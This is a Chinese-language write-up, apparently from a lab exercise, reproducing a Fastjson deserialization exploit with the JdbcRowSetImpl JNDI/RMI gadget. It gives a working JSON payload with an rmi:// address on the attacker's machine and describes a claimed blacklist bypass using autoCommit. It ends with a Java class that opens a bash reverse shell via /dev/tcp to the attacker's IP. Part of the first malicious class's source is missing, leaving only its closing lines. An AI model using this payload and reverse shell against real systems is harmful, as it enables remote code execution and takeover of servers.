在编写恶意代码LinuxTouch的时候,需要把LinuxTouch.java放到jdk1.8的bin目录下编译

原因:直接用javac编译会带有包名,而服务器中不会有这个包

LinuxTouch.java的源码如下:

        }catch(Exception e){
            e.printStackTrace();
        }
    }
    public static void main(String[] argv){
        LinuxTouch e = new LinuxTouch();
    }
}

源码解析:
"b":随便起的名字,无所谓
"@type": "com.sun.rowset.JdbcRowSetImpl" 自省操作,这个类下面某个函数具有漏洞
"dataSourceName": "rmi://192.168.142.132:9473/LinuxTouch" 当区9473下载LinuxTouch的时候,这个网页会告诉服务器去kali的8089下载恶意程序Linuxtouch
"autoCommit": true 默认不使用autoCommit,因为com.sun.rowset.jdbcRowSetImpl没加入黑名单了;这一句的作用是黑名单绕过
黑名单绕过参考链接:

复现不成功的几个原因

1、JDK11编译的class放到靶场JDK8的环境，不能运行
2、java源代码不能有包名（package name）
3、用python启动HTTP而不是Apache
4、docker-compose up不带-d可以看到日志

利用流程（原理）

1.setDataSourceName源码

当反序列化的时候,会自动调用setxxxx()函数来进行赋值

 public void setDataSourceName(String dsName) throws SQLException{

       if(getDataSourceName() != null) {
          if(!getDataSourceName().equals(dsName)) {
             super.setDataSourceName(dsName);
             conn = null;
             ps = null;
             rs = null;
          }
       }
       else {
          super.setDataSourceName(dsName);
       }
    }
//super.setDataSourceName(dsName);这一句就是单纯的赋值,dsName = rmi://192.168.142.132:9473/LinuxTouch

2.setAutoCommit源码

漏洞发生的地方

public void setAutoCommit(boolean autoCommit) throws SQLException {
        if(conn != null) {
           conn.setAutoCommit(autoCommit);
        } else {

           conn = connect();

           conn.setAutoCommit(autoCommit);

        }
    }
    //conn = connect(); 攻击源在这一句

connect()源码

private Connection connect() throws SQLException {

       if(conn != null) {
           return conn;

       } else if (getDataSourceName() != null) {

           try {
               Context ctx = new InitialContext();
          
               DataSource ds = (DataSource)ctx.lookup
                   (getDataSourceName()); 
                   
               if(getUsername() != null && !getUsername().equals("")) {
                    return ds.getConnection(getUsername(),getPassword());
               } else {
                    return ds.getConnection();
               }
           }
           catch (javax.naming.NamingException ex) {
               throw new SQLException(resBundle.handleGetObject("jdbcrowsetimpl.connect").toString());
           }

       } else if (getUrl() != null) {

           return DriverManager.getConnection
                   (getUrl(), getUsername(), getPassword());
       }
       else {
           return null;
       }

   }
//lookup:JNDI用于查找资源的一种方法,可以查找rmi资源                
                DataSource ds = (DataSource)ctx.lookup
                    (getDataSourceName()); //getDataSourceName() 这个函数的返回值就是DataSourceName,也就是我们传进去的rmi://192.168.142.132:9473/LinuxTouch
一旦lookup去查找rmi://192.168.142.132:9473/LinuxTouch,这个地址就会告诉lookup去下载8089端口下的LinuxTouch这个恶意文件

了解原理后回到这个反序列化的payload

"b": { "@type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "rmi://192.168.142.132:9473/LinuxTouch", "autoCommit": true
}
#"@type": "com.sun.rowset.JdbcRowSetImpl" 利用自省来避免类型丢失
#rmi://192.168.142.132:9473/LinuxTouch 初始化dataSourceName,为了让lookup去访问这个地址
#autoCommit lookup在conn()中,conn()在setAutoCommit(),当反序列化的时候,如果autoCommit有值,就会自动调用setAutoCommit()

public class LinuxRevers {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"/bin/bash", "-c", "bash -i >& /dev/tcp/192.168.142.132/9001 0>&1"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
        }
    }
}
